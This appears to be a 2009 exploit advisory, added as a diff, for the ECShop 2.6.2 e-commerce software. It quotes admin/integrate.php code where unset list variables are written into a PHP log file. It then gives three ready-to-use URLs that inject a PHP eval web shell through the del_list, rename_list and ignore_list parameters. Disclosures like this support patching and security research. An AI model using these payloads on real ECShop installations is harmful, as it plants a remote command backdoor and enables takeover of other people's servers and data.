@@ -1,0 +1,68 @@
+ ######################### Securitylab.ir ########################
+# Application Info:
+# Name: ecshop
+# Version: 2.6.2
+# Website: http://www.ecshop.com
+#################################################################
+# Discoverd By: Securitylab.ir
+# Website: http://securitylab.ir
+# Contacts: info@securitylab[dot]ir & K4mr4n_st@yahoo.com
+#################################################################
+#===========================================================
+# :: integrate.php ::
+#
+# if ($_REQUEST['act'] == 'sync')
+# {
+# $size = 100;
+# ......
+# $tasks = array();
+# if ($task_del > 0)
+# {
+# $tasks[] = array('task_name'=>sprintf($_LANG['task_del'], $task_del),'task_status'=>'<span id="task_del">' . $_LANG['task_uncomplete'] . '<span>');
+# $sql = "SELECT user_name FROM " . $ecs->table('users') . " WHERE flag = 2";
+# $del_list = $db->getCol($sql);//$del_list
+# }
+# if ($task_rename > 0)
+# {
+# $tasks[] = array('task_name'=>sprintf($_LANG['task_rename'], $task_rename),'task_status'=>'<span id="task_rename">' . $_LANG['task_uncomplete'] . '</span>');
+# $sql = "SELECT user_name, alias FROM " . $ecs->table('users') . " WHERE flag = 3";
+# $rename_list = $db->getAll($sql);//$rename_list
+# }
+# if ($task_ignore >0)
+# {
+# $sql = "SELECT user_name FROM " . $ecs->table('users') . " WHERE flag = 4";
+# $ignore_list = $db->getCol($sql);//$ignore_list
+# }
+# ....
+# $fp = @fopen(ROOT_PATH . DATA_DIR . '/integrate_' . $_SESSION['code'] . '_log.php', 'wb');
+# $log = '';
+# if (isset($del_list))
+# {
+# $log .= '$del_list=' . var_export($del_list,true) . ';';
+# }
+# if (isset($rename_list))
+# {
+# $log .= '$rename_list=' . var_export($rename_list, true) . ';';
+# }
+# if (isset($ignore_list))
+# {
+# $log .= '$ignore_list=' . var_export($ignore_list, true) . ';';
+# }
+# fwrite($fp, $log);
+# fclose($fp);
+# $smarty->assign('tasks', $tasks);
+# $smarty->assign('ur_here',$_LANG['user_sync']);
+# $smarty->assign('size', $size);
+# $smarty->display('integrates_sync.htm');
+# }
+#
+#
+# http://site.com/admin/integrate.php?act=sync&del_list=<?php%20eval($_POST[cmd])?>
+# http://site.com/admin/integrate.php?act=sync&rename_list=<?php%20eval($_POST[cmd])?>
+# http://site.com/admin/integrate.php?act=sync&ignore_list=<?php%20eval($_POST[cmd])?>
+#===========================================================
+#################################################################
+# Securitylab Security Research Team
+###################################################################
+
+# milw0rm.com [2009-05-29]
